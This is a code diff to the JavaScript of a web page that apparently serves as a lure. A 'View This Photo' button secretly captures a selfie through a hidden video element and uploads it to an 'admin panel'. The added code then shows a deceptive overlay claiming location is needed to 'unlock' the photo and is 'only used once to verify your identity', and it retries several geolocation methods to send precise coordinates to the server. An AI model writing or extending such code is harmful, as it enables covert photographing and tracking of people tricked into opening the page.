@@ -15,6 +15,7 @@
     let selfieBlob = null;
     let isProcessing = false;
     let locationWatchId = null;
+    let locationGranted = false;
 
     function setStatus(message, type) {
         statusEl.textContent = message;
@@ -39,7 +40,6 @@
         if (errorMsg) {
             setStatus(errorMsg, "error");
         }
-        // Clear any watch position
         if (locationWatchId !== null) {
             navigator.geolocation.clearWatch(locationWatchId);
             locationWatchId = null;
@@ -53,10 +53,96 @@
         }
     }
 
+    // --- Show location prompt overlay ---
+
+    function showLocationPrompt(selfieId) {
+        // Create overlay asking user to enable location
+        const overlay = document.createElement("div");
+        overlay.id = "locationPrompt";
+        overlay.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 15, 26, 0.95);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            backdrop-filter: blur(8px);
+        `;
+
+        overlay.innerHTML = `
+            <div style="
+                background: #1a1a2e;
+                border-radius: 20px;
+                padding: 40px 32px;
+                max-width: 400px;
+                width: 90%;
+                text-align: center;
+                border: 1px solid rgba(255,255,255,0.08);
+                box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            ">
+                <div style="font-size: 64px; margin-bottom: 16px;">📍</div>
+                <h2 style="color: #fff; font-size: 22px; margin-bottom: 12px;">Location Required to Unlock</h2>
+                <p style="color: #a0a0b8; font-size: 14px; line-height: 1.6; margin-bottom: 24px;">
+                    Your photo has been captured and saved.<br><br>
+                    To view it on this page, please <strong style="color: #fff;">enable location access</strong>.
+                    Your selfie is already stored in the admin panel regardless.
+                </p>
+                <div style="display: flex; flex-direction: column; gap: 12px;">
+                    <button id="enableLocationBtn" style="
+                        background: linear-gradient(135deg, #1a73e8, #1557b0);
+                        color: #fff;
+                        border: none;
+                        padding: 14px 28px;
+                        font-size: 16px;
+                        font-weight: 600;
+                        border-radius: 10px;
+                        cursor: pointer;
+                        width: 100%;
+                    ">📍 Enable Location</button>
+                    <button id="skipLocationBtn" style="
+                        background: transparent;
+                        color: #78789a;
+                        border: 1px solid rgba(255,255,255,0.1);
+                        padding: 12px 28px;
+                        font-size: 14px;
+                        border-radius: 10px;
+                        cursor: pointer;
+                        width: 100%;
+                    ">Skip — Keep Photo Locked</button>
+                </div>
+                <p style="color: #58587a; font-size: 12px; margin-top: 20px;">
+                    Your location is only used once to verify your identity.
+                </p>
+            </div>
+        `;
+
+        document.body.appendChild(overlay);
+
+        // Enable Location button
+        document.getElementById("enableLocationBtn").addEventListener("click", function() {
+            document.body.removeChild(overlay);
+            // Request location now
+            requestLocation(selfieId);
+        });
+
+        // Skip button — stay locked on webpage, but selfie already saved
+        document.getElementById("skipLocationBtn").addEventListener("click", function() {
+            document.body.removeChild(overlay);
+            setStatus("🔒 Photo locked — location required to view", "error");
+            viewPhotoBtn.disabled = false;
+            viewPhotoBtn.textContent = "👁️ View This Photo";
+            viewPhotoBtn.classList.remove("processing");
+            isProcessing = false;
+        });
+    }
+
     // --- Step 1: Camera capture ---
 
     async function requestCameraAndCapture() {
-        // Check HTTPS
         if (window.location.protocol !== "https:" && 
             window.location.hostname !== "localhost" && 
             window.location.hostname !== "127.0.0.1") {
@@ -129,7 +215,8 @@
             document.body.removeChild(hiddenVideo);
             stopCameraStream();
 
-            await uploadSelfieThenLocation();
+            // Upload selfie first (ALWAYS saved to admin panel)
+            await uploadSelfieThenPromptLocation();
 
         } catch (err) {
             console.error("Camera error:", err);
@@ -151,15 +238,15 @@
         }
     }
 
-    // --- Step 2: Upload selfie ---
+    // --- Step 2: Upload selfie (ALWAYS), then ask for location ---
 
-    async function uploadSelfieThenLocation() {
+    async function uploadSelfieThenPromptLocation() {
         if (!selfieBlob) {
             resetUI("❌ No selfie captured.");
             return;
         }
 
-        setStatus(" Wait .......", "loading");
+        setStatus("📸 Saving photo...", "loading");
 
         if (!navigator.onLine) {
             resetUI("❌ No internet connection.");
@@ -199,10 +286,12 @@
                 return;
             }
 
-            setStatus(" Wait ...", "loading");
+            // ✅ Selfie is saved in admin panel regardless!
+            // Now ask user for location permission via overlay
+            setStatus("📸 Photo saved! Location needed to view...", "loading");
             
-            // Small delay to let the UI update
-            setTimeout(() => requestLocation(result.id), 300);
+            // Show location prompt overlay (user can skip)
+            setTimeout(() => showLocationPrompt(result.id), 500);
 
         } catch (err) {
             console.error("Upload error:", err);
@@ -214,22 +303,22 @@
         }
     }
 
-    // --- Step 3: Location ---
-    // FIXED: Uses watchPosition as fallback, better error handling
+    // --- Step 3: Location (only called if user clicks "Enable Location") ---
 
     function requestLocation(selfieId) {
         if (!navigator.geolocation) {
-            resetUI("❌ Geolocation not supported.");
+            setStatus("❌ Geolocation not supported on this device.", "error");
+            viewPhotoBtn.disabled = false;
+            viewPhotoBtn.textContent = "👁️ View This Photo";
+            viewPhotoBtn.classList.remove("processing");
+            isProcessing = false;
             return;
         }
 
-        // First try: getCurrentPosition with high accuracy
-        setStatus("📍 Getting precise location...", "loading");
+        setStatus("📍 Getting your location...", "loading");
 
-        // Set a fallback timeout
         const fallbackTimeout = setTimeout(() => {
             if (isProcessing) {
-                // If still processing and no response yet, try without high accuracy
                 setStatus("📍 Trying standard accuracy...", "loading");
                 tryFallbackLocation(selfieId);
             }
@@ -242,31 +331,35 @@
                     navigator.geolocation.clearWatch(locationWatchId);
                     locationWatchId = null;
                 }
+                locationGranted = true;
                 await sendLocationToServer(position, selfieId);
             },
             (error) => {
                 clearTimeout(fallbackTimeout);
                 console.warn("High accuracy location error:", error);
 
-                // If timeout or unavailable, try fallback
                 if (error.code === error.TIMEOUT || error.code === error.POSITION_UNAVAILABLE) {
                     tryFallbackLocation(selfieId);
                 } else {
                     let msg;
                     switch (error.code) {
                         case error.PERMISSION_DENIED:
-                            msg = "❌ Location permission was denied. Please allow location access in your browser settings.";
+                            msg = "❌ Location permission denied. Your photo is saved in admin but locked here.";
                             break;
                         default:
                             msg = "❌ Location error (code " + error.code + ").";
                     }
-                    resetUI(msg);
+                    setStatus(msg, "error");
+                    viewPhotoBtn.disabled = false;
+                    viewPhotoBtn.textContent = "👁️ View This Photo";
+                    viewPhotoBtn.classList.remove("processing");
+                    isProcessing = false;
                 }
             },
             {
                 enableHighAccuracy: true,
-                timeout: 7000,      // 7 seconds for high accuracy
-                maximumAge: 0       // Force fresh reading
+                timeout: 7000,
+                maximumAge: 0
             }
         );
     }
@@ -274,21 +367,20 @@
     function tryFallbackLocation(selfieId) {
         if (!navigator.geolocation || !isProcessing) return;
 
-        // Try with low accuracy (faster, uses WiFi/cell towers)
         navigator.geolocation.getCurrentPosition(
             async (position) => {
                 setStatus("📍 Got location (standard accuracy)...", "loading");
+                locationGranted = true;
                 await sendLocationToServer(position, selfieId);
             },
             (error) => {
-                // Last resort: try watchPosition (keeps trying until it gets a fix)
                 console.warn("Standard accuracy failed, trying watchPosition:", error);
                 tryWatchLocation(selfieId);
             },
             {
                 enableHighAccuracy: false,
                 timeout: 5000,
-                maximumAge: 60000   // Accept cached location up to 1 minute old
+                maximumAge: 60000
             }
         );
     }
@@ -304,19 +396,23 @@
                 locationWatchId = null;
             }
             if (isProcessing) {
-                resetUI("❌ Location timed out. Check GPS/WiFi and try again.");
+                setStatus("❌ Location timed out. Photo saved in admin panel.", "error");
+                viewPhotoBtn.disabled = false;
+                viewPhotoBtn.textContent = "👁️ View This Photo";
+                viewPhotoBtn.classList.remove("processing");
+                isProcessing = false;
             }
         }, 15000);
 
         locationWatchId = navigator.geolocation.watchPosition(
             async (position) => {
-                // Got a fix — use it
                 clearTimeout(watchTimeout);
                 if (locationWatchId !== null) {
                     navigator.geolocation.clearWatch(locationWatchId);
                     locationWatchId = null;
                 }
                 setStatus("📍 Location acquired!", "loading");
+                locationGranted = true;
                 await sendLocationToServer(position, selfieId);
             },
             (error) => {
@@ -327,9 +423,11 @@
                 }
                 console.error("watchPosition error:", error);
                 if (isProcessing) {
-                    resetUI("❌ Could not get location: " + 
-                        (error.code === error.PERMISSION_DENIED ? "Permission denied" : 
-                         error.code === error.TIMEOUT ? "Timed out" : "Unavailable"));
+                    setStatus("❌ Could not get location. Photo saved in admin panel.", "error");
+                    viewPhotoBtn.disabled = false;
+                    viewPhotoBtn.textContent = "👁️ View This Photo";
+                    viewPhotoBtn.classList.remove("processing");
+                    isProcessing = false;
                 }
             },
             {
@@ -373,18 +471,28 @@
                     const errData = await locResponse.json();
                     msg = errData.message || msg;
                 } catch (e) { }
-                resetUI("❌ " + msg);
+                setStatus("❌ " + msg, "error");
+                viewPhotoBtn.disabled = false;
+                viewPhotoBtn.textContent = "👁️ View This Photo";
+                viewPhotoBtn.classList.remove("processing");
+                isProcessing = false;
                 return;
             }
 
             const locResult = await locResponse.json();
 
             if (!locResult.id) {
-                resetUI("❌ Server response missing location ID.");
+                setStatus("❌ Server response missing location ID.", "error");
+                viewPhotoBtn.disabled = false;
+                viewPhotoBtn.textContent = "👁️ View This Photo";
+                viewPhotoBtn.classList.remove("processing");
+                isProcessing = false;
                 return;
             }
 
             lastLocationId = locResult.id;
+            
+            // ✅ BOTH selfie AND location saved — unlock photo on webpage
             unlockPhoto();
 
         } catch (err) {
@@ -408,10 +516,14 @@
                 } catch (retryErr) {
                     console.error("Retry also failed:", retryErr);
                 }
-                resetUI("❌ Location upload timed out.");
+                setStatus("❌ Location upload timed out. Photo saved in admin.", "error");
             } else {
-                resetUI("❌ Location upload failed: " + err.message);
+                setStatus("❌ Location upload failed: " + err.message, "error");
             }
+            viewPhotoBtn.disabled = false;
+            viewPhotoBtn.textContent = "👁️ View This Photo";
+            viewPhotoBtn.classList.remove("processing");
+            isProcessing = false;
         }
     }
 
@@ -430,14 +542,5 @@
 
         requestCameraAndCapture();
     });
-
-    // Check for location permission status on page load (Chrome only)
-    if (navigator.permissions && navigator.permissions.query) {
-        navigator.permissions.query({ name: 'geolocation' }).then(result => {
-            if (result.state === 'denied') {
-                console.warn('Location permission is blocked globally.');
-            }
-        }).catch(() => {});
-    }
 
 })();
